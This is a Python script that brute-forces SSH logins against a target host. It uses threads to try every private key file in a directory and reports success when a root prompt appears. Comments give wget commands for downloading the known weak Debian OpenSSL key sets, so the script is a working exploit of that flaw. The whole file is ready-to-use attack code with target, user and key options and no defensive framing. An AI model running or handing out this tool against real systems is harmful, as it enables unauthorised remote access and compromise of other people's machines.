import pexpect
import optparse
import threading
import os

maxConnections = 5

connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


def connect(user, host, keyfile, release):
    global Found
    global Fails
    try:
        perm_denied = "Permission denied"
        ssh_newkey = "Are you sure you want to continue"
        conn_closed = "Connection closed by remote host"
        opt = " -o PasswordAuthentication=no"
        connStr = "ssh " + user + "@" + host + " -i " + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, "#"])
        if ret == 2:
            print("[-] Adding Host to ~/.ssh/known_hosts")
            child.sendline("yes")
            connect(user, host, keyfile, False)
        elif ret == 3:
            print("[-] Connection Closed By Remote Host")
            Fails += 1
        elif ret > 3:
            print("[+] Success." + str(keyfile))
            Found = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser(
        "usage%prog -H <target host> -u <user> -d <keyfile directory>"
    )
    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
    parser.add_option("-u", dest="user", type="string", help="specify user name")
    parser.add_option(
        "-d", dest="passdir", type="string", help="specify the keyfile directory"
    )
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passdir
    user = options.user
    if host is None or user is None or passDir is None:
        print(parser.usage)
        exit(0)

    # list of 1024 2048 priv cert here :
    # wget https://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2
    # wget https://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_2048_x86.tar.bz2

    for filename in os.listdir(passDir):
        if Found:
            print("[*] Exiting: keyfile found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Connection Closed By Remote Host")
            exit(0)

        connection_lock.acquire()
        fullpath = os.path.join(passDir, filename)
        print("[-] Testing: " + str(fullpath))
        t = threading.Thread(target=connect, args=(user, host, fullpath, True))
        t.start()


if __name__ == "__main__":
    main()
